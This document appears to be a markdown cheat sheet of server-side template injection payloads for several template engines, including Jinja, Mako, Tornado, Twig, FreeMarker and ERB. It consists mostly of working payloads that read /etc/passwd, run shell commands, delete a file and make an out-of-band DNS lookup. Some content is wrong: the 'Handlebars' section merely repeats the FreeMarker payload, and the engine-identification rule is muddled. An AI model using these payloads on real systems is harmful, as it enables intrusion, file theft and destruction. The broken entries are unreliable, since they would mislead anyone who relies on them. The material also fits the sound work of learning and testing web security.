# Server-side Template Injection (SSTI)
## Identifying 
```bash
${{<%[%'"}}%\.
{7*7}
```
- Identifying template
<img width="1440" height="943" alt="image" src="https://github.com/user-attachments/assets/a007c8e6-b48c-4d03-b55c-3a900cbb7de8" />

I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Template else if the answer is this 49 is a Twig Template

## Jinja Exploit (python)
```bash
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
# LFI
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
# RCE
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Mako Exploit (python)
```bash
<% print 7*7 %>
<%25+system("rm+/home/carlos/morale.txt")%25> 
```

## Tornado Exploit (python)
```
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

## Twigo Exploit (php)
```bash
{{ _self }}
# LFI
{{ "/etc/passwd"|file_excerpt(1,-1) }}
# RCE
{{ ['id'] | filter('system') }}
```

## FreeMarker Exploit (java)
```
${.version}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

## Handlebars Exploit (js)
```
${.version}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
```

# Embedded Ruby Exploit (ruby)
```
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```
